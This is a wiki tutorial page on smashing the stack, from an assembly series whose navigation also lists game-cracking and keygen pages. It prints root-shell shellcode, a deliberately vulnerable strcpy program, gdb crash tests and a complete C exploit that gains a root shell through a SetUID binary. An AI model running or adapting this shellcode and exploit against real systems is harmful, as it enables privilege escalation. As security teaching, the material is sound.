---
title: 'Wiki: Example 4'
author: ron
layout: wiki
permalink: "/wiki/Example_4"
date: '2024-08-04T15:51:38-04:00'
redirect_from:
- "/wiki/index.php/Example_4"
---

Please choose a tutorial page:

-   [Fundamentals](Fundamentals "wikilink") \-- Information about C
-   [Tools](Tools "wikilink")
-   [Registers](Registers "wikilink")
-   [Simple Instructions](Simple_Instructions "wikilink")
-   [Example 1](Example_1 "wikilink") \-- SC CDKey Initial Verification
-   [Example 2](Example_2 "wikilink") \-- SC CDKey Shuffle
-   [Example 2b](Example_2b "wikilink") \-- SC CDKey Final Decode
-   [The Stack](The_Stack "wikilink")
    -   [Stack Example](Stack_Example "wikilink")
-   [Functions](Functions "wikilink")
-   [Example 3](Example_3 "wikilink") \-- Storm.dll SStrChr
-   [Assembly Summary](Assembly_Summary "wikilink")
-   [Machine Code](Machine_Code "wikilink")
-   [Example 4](Example_4 "wikilink") \-- Smashing the Stack
-   [Cracking a Game](Cracking_a_Game "wikilink")
-   [Example 5](Example_5 "wikilink") \-- Cracking a game
-   [Example 6](Example_6 "wikilink") \-- Writing a keygen
-   [.dll Injection and Patching](.dll_Injection_and_Patching "wikilink")
-   [Memory Searching](Memory_Searching "wikilink")
-   [Example 7](Example_7 "wikilink") \-- Writing a cheat for Starcraft (1.05)
    -   [Example 7 Step 1](Example_7_Step_1 "wikilink") \-- Displaying Messages
    -   [Example 7 Step 1b](Example_7_Step_1b "wikilink") \-- Above, w/ func ptrs
    -   [Example 7 Final](Example_7_Final "wikilink")
-   [Example 8](Example_8 "wikilink") \-- Getting IX86.dll files
-   [16-bit Assembly](16-bit_Assembly "wikilink")
-   [Example 9](Example_9 "wikilink") \-- Keygen for a 16-bit game
-   [Example 10](Example_10 "wikilink") \-- Writing a loader

---


This is the first practical example here, and I thought it appropriate to use something that not only illustrates the concept of machine code, but also involves something I\'m very interested in: security.

This example will demonstrate a stack overflow vulnerability.

This example will be done on Linux, with gcc. Windows does funny things to the stack that I don\'t really want to explain, and exploiting a vulnerability on Windows is trickier.

For more information on stack overflows, have a look at the paper [Smashing the Stack for Fun and Profit](http://insecure.org/stf/smashstack.html) by Aleph One.

## Local Exploits {#local_exploits}

If you haven\'t done any real research on vulnerabilities and exploits, that\'s fine. This section will briefly cover what you need to know.

Some programs on Linux run with root, or superuser privilege. For example, programs that need access to the /etc/shadow file require root access, since the shadow file is inaccessible to normal users. If a user can take control of these programs and have the program run a shell, the shell will run as the same user as the program, which is root. From there, the attacker can run whichever program he chooses with root access, which means he has full control of the system.

So the steps are:

-   Find a SetUID program (ie, a program that runs as root)
-   Find a vulnerability in the program
-   Exploit it

The way to exploit the vulnerability is to trick the program into running arbitrary machine code, supplied by the attacker. The machine code, of course, represents assembly instructions. This machine code is called \"shellcode\", because it traditionally spawns a shell for the attacker.

## Shellcode

Here is some standard shellcode, with annotations. I won\'t explain what this does, because you should know how every line works, by now. The only tricky part is the Linux system call, which is explained in the comments:

        ;;;;;;;;
        ; Name: shellcode.asm
        ; Author: Jon Erickson
        ; Date: March 24, 2005
        ; To compile: nasm shellcode.asm
        ; Requires: nasm <http://nasm.sourceforge.net>
        ;
        ; Purpose: This is similar to shellcode.asm except that it
        ; uses more condensed code and some tricks like xor'ing a
        ; variable with itself to eliminate null (00) bytes, which
        ; allows it to be stored in an ordinary string.
        ;;;;;;;;
        BITS 32

        ; setreuid(uid_t ruit, uid_t euid)
        xor eax, eax        ; First eax must be 0 for the next instruction
        mov al, 70          ; Put 70 into eax, since setreuid is syscall #70
        xor ebx, ebx        ; Put 0 into ebx, to set the real uid to root
        xor ecx, ecx        ; Put 0 into ecx, to set the effective uid to root
        int 0x80            ; Call the kernel to make the system call happen

        jmp short two       ; jump down to the bottom to get the address of "/bin/sh"
      one:
        pop ebx             ; pop the "return address" from the stack
                            ; to put the address of the string into ebx
        ; execve(const char *filename, char *const argv [], char *const envp[])
        xor eax, eax        ; Clear eax
        mov [ebx+7], al     ; Put the 0 from eax after the "/bin/sh"
        mov [ebx+8], ebx    ; Put the address of the string from ebx here
        mov [ebx+12], eax   ; Put null here

        mov al, 11          ; execve is syscall #11
        lea ecx, [ebx+8]    ; Load the address that points to /bin/sh
        lea edx, [ebx+12]   ; Load the address where we put null
        int 0x80            ; Call the kernel to make the system call happen

      two:
        call one            ; Use a call to get back to the top to get this
                            ; address
    db '/bin/sh'

This code can be assembled with nasm, to produce the following machine code:

        ron@slayer:~$ nasm shellcode.asm
        ron@slayer:~$ hexdump -C shellcode
        00000000  31 c0 b0 46 31 db 31 c9  cd 80 eb 16 5b 31 c0 88  |1À°F1Û1ÉÍ.ë.[1À.|
        00000010  43 07 89 5b 08 89 43 0c  b0 0b 8d 4b 08 8d 53 0c  |C..[..C.°..K..S.|
        00000020  cd 80 e8 e5 ff ff ff 2f  62 69 6e 2f 73 68        |Í.èåÿÿÿ/bin/sh|

Note that there isn\'t a single \'00\' byte. This is intentional, because shellcode is often stored in a string, and \'00\', or \'\\0\', terminates strings.

When this machine code runs, it attempts to spawn /bin/sh as root. This shellcode can be changed to any assembly (provided there are no 00 bytes). A common modification is changing the exploit to open a network port and listen for connections, or to connect back to the attacker. That behaviour is, obviously, used in network-based attacks.

## Reminder: the Stack {#reminder_the_stack}

If you don\'t remember how the stack works, go back and re-read the section on the stack.

Remember that the stack for a function looks like this, from bottom to top:

-   \... used by calling function \...
-   parameters
-   return address
-   local variables
-   saved registers
-   \...unallocated\...

Remember also that arrays are simply a sequence of bytes stored somewhere. In the case of local variables, the array is stored on the stack.

Because an array operation is simply a memory access converted to assembly, a program doesn\'t actually know how long the array is. All it knows is what the programmer told it to do. If the programmer says it\'s ok to copy 100 bytes into an array, then the array is, presumably, at least 100 bytes long.

Sometimes, a program forgets to check how much data the program can copy, which allows an attacker to provide too much data. The program, not knowing any better, copies the data past the end of the array, over other local variables. If it goes far enough, the return address may be overwritten. If the attacker can control the return address, then the return address can be pointed at the shellcode. Then when the \"ret\" instruction is issued, and ret pops off the return address to jump to, it instead gets the address of the shellcode!

In other words, the return address is overwritten with the address of the shellcode, so when the function returns the shellcode runs.

## The Vulnerable Program {#the_vulnerable_program}

Here is a vulnerable program I wrote several years ago, for a paper (except that I fixed a couple spelling mistakes and changed the array size). It\'s extremely simple, and is only meant as a demonstration:

        /**
        * Name: StackVuln.c
        * Author: Ron Bowes
        * Date: March 24, 2004
        * To compile: gcc StackVuln.c -o StackVuln
        * Requires: n/a
        *
        * Purpose: This code is vulnerable to a stack overflow if more than
        * 20 characters are entered. The exploit for it was written by
        * Jon Erickson in Hacking: Art of exploitation, but I wrote
        * this vulnerable code independently.
        */
        #include <stdio.h>
        #include <string.h>
        int main(int argc, char *argv[])
        {
            char string[40];
            strcpy(string, argv[1]);
            printf("The message was: %s\n", string);
            printf("Program completed normally!\n\n");
            return 0;
        }

## Some Testing {#some_testing}

First, the program is compiled and tested with normal data:

        ron@slayer:~$ gcc StackVuln.c -o StackVuln
        ron@slayer:~$ ./StackVuln "This is a test"
        The message was: This is a test
        Program completed normally!

Now we\'ll try it with progressively longer strings, in the *gdb* debugger, starting at 40 characters, then 50, 60. At 60, an \"illegal instruction\" occurs, which means we\'re close. Adding 4 more causes the crash we want:

    ron@slayer:~$ gdb StackVuln
    (gdb) run 1234567890123456789012345678901234567890
        Starting program: /home/ron/StackVuln 1234567890123456789012345678901234567890
        The message was: 1234567890123456789012345678901234567890
        Program completed normally!
        Program exited normally.

    (gdb) run 12345678901234567890123456789012345678901234567890
        Starting program: /home/ron/StackVuln 12345678901234567890123456789012345678901234567890
        The message was: 12345678901234567890123456789012345678901234567890
        Program completed normally!
        Program exited normally.

    (gdb) run 123456789012345678901234567890123456789012345678900123456789
        Starting program: /home/ron/StackVuln 123456789012345678901234567890123456789012345678900123456789
        The message was: 123456789012345678901234567890123456789012345678900123456789
        Program completed normally!

        Program received signal SIGILL, Illegal instruction.
        0xb7ed3f00 in __libc_start_main () from /lib/tls/libc.so.6

    (gdb) run 1234567890123456789012345678901234567890123456789001234567890123
        Starting program: /home/ron/StackVuln 1234567890123456789012345678901234567890123456789001234567890123
        The message was: 1234567890123456789012345678901234567890123456789001234567890123
        Program completed normally!

        Program received signal SIGSEGV, Segmentation fault.
        0x33323130 in ?? ()

Note the address that it crashed at: 0x38373635. Remembering ascii, we know that 0x33 is \'3\', 0x32 is \'2\', 0x31 is \'1\', and 0x30 is \'0\'. That means that the return address was overwritten by the 0123. This theory can be tested by changing those characters to AAAA (\'A\' is 0x41, so the return address will likely be 0x41414141):

        Starting program: /home/ron/StackVuln 123456789012345678901234567890123456789012345678900123456789AAAA
        The message was: 123456789012345678901234567890123456789012345678900123456789AAAA
        Program completed normally!

        Program received signal SIGSEGV, Segmentation fault.
        0x41414141 in ?? ()

The expected result is confirmed!

## The Exploit {#the_exploit}

To make this work well, I removed the display line from the program. Printing the shellcode to the terminal made things ugly.

While I used my old code for the vulnerable program, I re-wrote the exploit from scratch to make it simpler, so that it doesn\'t require a nop-slide (See below). Here is the program that exploits the vulnerable program above, with comments:

        /**
         * Name: Stackexploit.c
         * Author: Ronald Bowes
         * Date: March 13, 2007
         * To compile: gcc Stackexploit.c -o Stackexploit
         * Requires: The vulnerable program, called "StackVuln"
         *
         * Purpose: This code, originally from Hacking: Art of exploitation,
         * exploits a program with a stack overflow in a 40 character buffer
         * by writing 64 characters to it.
         */
        #include <stdlib.h>
        #include <string.h>
        #include <unistd.h>

        int main(int argc, char *argv[])
        {
            /* This string simulates the string in the vulnerable application. As long
             * as this program is called with the same commandline arguments, this string
             * will be in the same position in memory, which lets us set the return addres
             * in the target program. */
            char string[40];
        
            /* Here is the shellcode. The XXXX at the end will be overwritten by the address
             * of "string" */
            char exploit[] =
                "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80" /*  1 - 10 */
                "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b" /* 11 - 20 */
                "\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d" /* 21 - 30 */
                "\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f" /* 31 - 40 */
                "\x62\x69\x6e\x2f\x73\x68\x90\x90\x90\x90" /* 41 - 50 */
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" /* 51 - 60 */
                "XXXX"; /* 61 - 64 */

            /* These two lines cause the program to execute itself the same way
             * the vulnerable program will be executed. This ensures that the stack
             * is set up identicly, so the "string" declared here will have the same
             * address as the "string" in the vulnerable program. */
            if(argc < 2)
                execl(argv[0], "StackVuln", exploit, 0);
        
            /* Overwrite the XXXX with the address that's being jumped to. This is the address
             * of our simulated variable. */
             *((int*)(exploit + 60)) = &string;

            /* Finally, ow call the program with our exploit as the argument */
            execl("./StackVuln", "StackVuln", exploit, 0);

            return 0;
        }

Here, the vulnerable program is set to be SetUID (ie, run as root), and is run with the exploit program:

        ron@slayer:~$ sudo chown root.root StackVuln
        ron@slayer:~$ sudo chmod +s StackVuln
        ron@slayer:~$ ls -l StackExploit StackVuln
         -rwxr-xr-x  1 ron  users 11180 2007-03-14 13:46 StackExploit*
         -rwsr-sr-x  1 root root  11132 2007-03-14 13:36 StackVuln*
        ron@slayer:~$ ./StackExploit
        Program completed normally!

        sh-2.05b# whoami
        root

## nop Slide {#nop_slide}

This section isn\'t necessary to assembly, but if you\'re curious about this exploit and ones like it, this is for you.

In most cases, the attacker doesn\'t have the benefit of being able to simulate the stack of the original program, which makes it impossible to know where to jump. In those cases, the jump is often a guess, which may or may not be right.

To avoid the requirement for pin-point accuracy, as many nop instructions as possible are commonly put in front of the shellcode. These nops, known as a nop-slide, give the attacker a bigger target to return to. Instead of having to return to a specific address, the return address need only be one of the nop instructions. If any nop instruction is hit, it runs, doing nothing, the next one runs, also doing nothing, and so on. Eventually, after the nops have all run, the shellcode is run as before.

nop sleds are very common in exploits, unless the return address is in a predictable location.

## Questions

Feel free to edit this section and post questions, I\'ll do my best to answer them. But you may need to contact me to let me know that a question exists.

[Category: Assembly Examples](Category:_Assembly_Examples "wikilink")
